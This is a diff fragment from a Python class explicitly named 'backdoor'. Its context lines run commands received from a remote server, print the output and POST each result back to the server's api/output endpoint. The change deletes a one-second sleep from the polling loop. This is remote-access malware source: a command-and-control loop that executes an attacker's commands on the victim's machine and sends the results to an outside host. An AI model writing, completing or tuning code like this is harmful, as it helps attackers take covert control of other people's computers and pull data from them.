@@ -16,7 +16,7 @@ class backdoor:
                 output = self.run(commands[i])
                 print(output)
                 requests.post(f"{self.url}api/output/{self.id}/{i}", data={'output':output})
-            time.sleep(1)
+            
     def run(self, command):
         output = ""
         commands_to_execute = command.split("\r\n")
